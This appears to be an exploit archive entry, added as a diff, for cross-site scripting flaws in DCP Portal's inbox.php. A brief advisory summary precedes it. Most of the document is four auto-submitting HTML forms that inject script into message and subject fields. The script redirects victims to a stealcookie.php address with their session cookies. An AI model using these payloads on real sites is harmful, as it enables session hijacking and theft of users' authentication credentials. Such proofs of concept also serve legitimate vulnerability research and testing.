@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/17050/info
+   
+DCP Portal is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+   
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+<form action='http://www.example.com/dcp-portal611/inbox.php?action=send' method="post">
+<input type="text" name="subject" value='"><script>document.location="http://www.example.com/stealcookie.php?"+document.cookie</script>' />
+<input type="text" name="message" value='' />
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action='http://www.example.com/dcp-portal611/inbox.php?action=send' method="post">
+<input type="text" name="message" value='">&lt;/textarea&gt;<script>document.location="http://www.example.com/stealcookie.php?"+document.cookie</script>' />
+<input type="text" name="subject" value='' />
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action='http://www.example.com/dcp-portal611/inbox.php?action=delete&subject="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>' method="post">
+<input type="submit" name="submit" value='Reply'>
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action='http://www.example.com/dcp-portal611/inbox.php?action=delete&message=">&lt;/textarea&gt;<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>' method="post">
+<input type="submit" name="submit" value='Reply'>
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
